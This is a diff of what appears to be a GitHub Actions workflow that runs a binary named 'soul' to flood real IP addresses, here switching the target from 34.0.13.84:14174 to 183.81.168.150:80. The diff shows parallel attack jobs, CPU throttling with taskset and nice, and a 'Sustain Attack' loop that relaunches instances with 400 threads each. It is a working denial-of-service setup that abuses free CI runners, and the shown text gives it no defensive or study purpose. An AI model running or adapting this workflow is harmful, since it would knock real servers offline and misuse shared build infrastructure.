@@ -13,7 +13,7 @@ jobs:
       - name: Setup environment
         run: |
           chmod +x soul
-          echo "Attack target: 34.0.13.84:14174 for 180s"
+          echo "Attack target: 183.81.168.150:80 for 60s"
 
   # Main attack dengan parallel jobs optimized
   attack-main:
@@ -30,7 +30,7 @@ jobs:
         run: |
           chmod +x soul
           # CPU affinity and nice to manage CPU usage
-          taskset -c $(({{ matrix.batch % 2 } + 1)) ./soul 34.0.13.84 14174 180 400 &
+          taskset -c $(({{ matrix.batch % 2 } + 1)) ./soul 183.81.168.150 80 60 400 &
           sleep 2
           # Limit CPU usage to ~50% by alternating cores
           while kill -0 $! 2>/dev/null; do
@@ -55,7 +55,7 @@ jobs:
         run: |
           chmod +x soul
           # Run with lower priority
-          nice -n 10 ./soul 34.0.13.84 14174 180 400 &
+          nice -n 10 ./soul 183.81.168.150 80 60 400 &
           PID=$!
           # Monitor and adjust CPU
           while kill -0 $PID 2>/dev/null; do
@@ -76,13 +76,13 @@ jobs:
       - name: Sustain Attack
         run: |
           chmod +x soul
-          END=$((SECONDS+180))
+          END=$((SECONDS+60))
           while [ $SECONDS -lt $END ]; do
             # Start multiple instances but with CPU control
             for i in 1 2; do
-              taskset -c 0 nice -n 5 ./soul 34.0.13.84 14174 5 400 > /dev/null 2>&1 &
+              taskset -c 0 nice -n 5 ./soul 183.81.168.150 80 5 400 > /dev/null 2>&1 &
               sleep 1
-              taskset -c 1 nice -n 5 ./soul 34.0.13.84 14174 5 400 > /dev/null 2>&1 &
+              taskset -c 1 nice -n 5 ./soul 183.81.168.150 80 5 400 > /dev/null 2>&1 &
             done
             sleep 3
             # Kill all after each cycle to prevent CPU spikes
